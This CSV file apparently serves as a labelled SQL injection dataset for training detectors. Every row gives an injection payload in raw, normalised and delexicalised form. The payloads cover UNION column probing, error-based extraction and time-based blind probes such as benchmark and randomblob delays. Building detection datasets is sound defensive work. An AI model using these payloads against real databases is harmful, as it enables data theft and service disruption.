payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1'   )    )    union all select null,null#","1' ) ) union all select null,null#","<NUM>' ) ) union all select null,null#",1,False,,sqli_dataset
select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 8841 = 9675 ) then 8841 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
1%'  )   union all select null#,1%' ) union all select null#,<NUM>%' ) union all select null#,1,False,,sqli_dataset
"-4419%""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","-4419%"" ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","-<NUM>%"" ) ) or <NUM> group by concat ( 0x7171706a71, ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) having min ( <NUM> ) #",1,True,,sqli_dataset
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","1"" ) ) as ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>"" ) ) as ecnn where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1"" union all select null--","1"" union all select null--","<NUM>"" union all select null--",1,False,,sqli_dataset
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""azzv"" like ""azzv","select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""azzv"" like ""azzv","select benchmark ( <NUM>,md5 ( 0x4c4d6142 ) ) and <STR> like ""azzv",1,True,,sqli_dataset
"1'  )   union all select null,null,null,null#","1' ) union all select null,null,null,null#","<NUM>' ) union all select null,null,null,null#",1,False,,sqli_dataset
1' where 9583  =  9583 and 5319  =  7670#,1' where 9583 = 9583 and 5319 = 7670#,<NUM>' where <NUM> = <NUM> and <NUM> = <NUM>#,1,False,,sqli_dataset
1'  )   as tvqn where 2967  =  2967,1' ) as tvqn where 2967 = 2967,<NUM>' ) as tvqn where <NUM> = <NUM>,1,False,,sqli_dataset
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  ""","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = ""","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( <STR> = """,1,False,,sqli_dataset
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ybjo'  =  'ybjo","1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'ybjo' = 'ybjo",<NUM><STR>abcdefg<STR>ybjo<STR>ybjo,1,False,,sqli_dataset
"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'vbda' like 'vbda","1' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( 'vbda' like 'vbda",<NUM><STR>vbda<STR>vbda,1,True,,sqli_dataset
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # myqr","1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # myqr","<NUM> and ( select <NUM> from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from information_schema.character_sets group by x ) a ) # myqr",1,True,,sqli_dataset
select   (  case when   (  3217  =  8421  )   then 3217 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 3217 = 8421 ) then 3217 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,select ( case when ( 6435 = 8988 ) then 6435 else 6435* ( select 6435 from information_schema.character_sets ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) #,1,False,,sqli_dataset
"1%""   )    )     )   order by 1--","1%"" ) ) ) order by 1--","<NUM>%"" ) ) ) order by <NUM>--",1,False,,sqli_dataset
